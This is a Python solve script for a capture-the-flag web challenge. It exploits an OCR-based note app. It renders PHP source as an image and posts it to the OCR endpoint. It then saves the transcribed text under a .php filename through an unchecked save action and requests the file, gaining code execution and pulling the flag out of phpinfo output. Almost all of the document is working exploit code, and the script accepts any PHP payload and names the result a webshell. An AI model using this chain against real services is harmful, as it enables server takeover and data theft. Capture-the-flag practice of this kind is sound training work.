#!/usr/bin/env python3
"""
Escrita a mao (WEB) - OCR injection -> arbitrary .php write -> RCE.

The app OCRs a PNG you POST to api.php?acao=reconhecer and stores the text
under an id. api.php?acao=salvar writes that text to /arquivos/<session>/<nome>,
and `nome` accepts a `.php` extension (served/executed by Apache). The OCR
transcribes clean printed text faithfully, so we render a PHP payload as an
image, let the server "recognize" it back into source code, save it as .php and
request it to execute.

OCR caveat: it reliably reads letters, digits and `< ? ; ( ) >` but mangles
`$ _ [ ] " '`. So the payload must avoid those -> `<?php phpinfo(); ?>` is
enough here (the flag lives in an environment variable, dumped by phpinfo).

Usage:
    python3 solve.py http://<HOST>:<PORT> '<?php phpinfo(); ?>' shell.php
"""
import sys, io, json, base64, urllib.request

from PIL import Image, ImageDraw, ImageFont

FONTS = [
    "/usr/share/fonts/TTF/DejaVuSansMono.ttf",
    "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    "/usr/share/fonts/TTF/DejaVuSans.ttf",
]


def render(text: str) -> str:
    font = next((ImageFont.truetype(p, 48) for p in FONTS
                 if _exists(p)), ImageFont.load_default())
    bb = ImageDraw.Draw(Image.new("L", (10, 10), 255)).textbbox((0, 0), text, font=font)
    w, h = bb[2] - bb[0] + 40, bb[3] - bb[1] + 40
    img = Image.new("L", (w, h), 255)
    ImageDraw.Draw(img).text((20 - bb[0], 20 - bb[1]), text, fill=0, font=font)
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return "data:image/png;base64," + base64.b64encode(buf.getvalue()).decode()


def _exists(path):
    try:
        open(path, "rb").close()
        return True
    except OSError:
        return False


def api(base, cookies, acao, body=None):
    url = f"{base}/api.php?acao={acao}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    req.add_header("Content-Type", "application/json")
    if cookies:
        req.add_header("Cookie", cookies)
    resp = urllib.request.urlopen(req, timeout=30)
    jar = resp.headers.get("Set-Cookie")
    cookie = jar.split(";")[0] if jar else cookies
    return json.loads(resp.read()), cookie


def main():
    base = sys.argv[1].rstrip("/")
    payload = sys.argv[2] if len(sys.argv) > 2 else "<?php phpinfo(); ?>"
    nome = sys.argv[3] if len(sys.argv) > 3 else "shell.php"

    _, cookie = api(base, "", "listar")                      # establish session
    rec, cookie = api(base, cookie, "reconhecer", {"imagem": render(payload)})
    print("[+] OCR     :", repr(rec.get("texto")))
    saved, cookie = api(base, cookie, "salvar", {"id": rec["id"], "nome": nome})
    url = base + saved["url"]
    print("[+] webshell:", url)

    req = urllib.request.Request(url)
    req.add_header("Cookie", cookie)
    out = urllib.request.urlopen(req, timeout=30).read().decode(errors="replace")

    import re
    flag = re.search(r"IDP\{[^}]*\}", out)
    print("[+] FLAG    :", flag.group(0) if flag else "(not in output; inspect manually)")


if __name__ == "__main__":
    main()
